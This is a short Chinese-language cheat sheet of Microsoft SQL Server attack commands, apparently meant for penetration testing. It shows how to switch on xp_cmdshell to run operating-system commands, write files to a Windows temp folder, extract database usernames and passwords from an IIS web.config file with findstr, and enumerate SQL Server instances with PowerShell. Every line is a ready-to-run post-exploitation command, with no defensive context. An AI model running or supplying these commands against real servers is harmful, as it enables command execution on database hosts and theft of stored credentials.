command:
开启xp_cmdshell:
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

关闭xp_cmdshell:
EXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE;
EXEC sp_configure 'show advanced options', 0; RECONFIGURE;

mssql写文件(代替echo): exec master..xp_cmdshell '>>c:\windows\temp\info.txt set /p="content" <nul';

查看web.config密码: exec master..xp_cmdshell 'findstr /c:"User Id=" /c:"Password=" /si c:\inetpub\wwwroot\web.config';

枚举MSSQL实例: PowerShell -Command "[System.Data.Sql.SqlDataSourceEnumerator]::Instance.GetDataSources()"
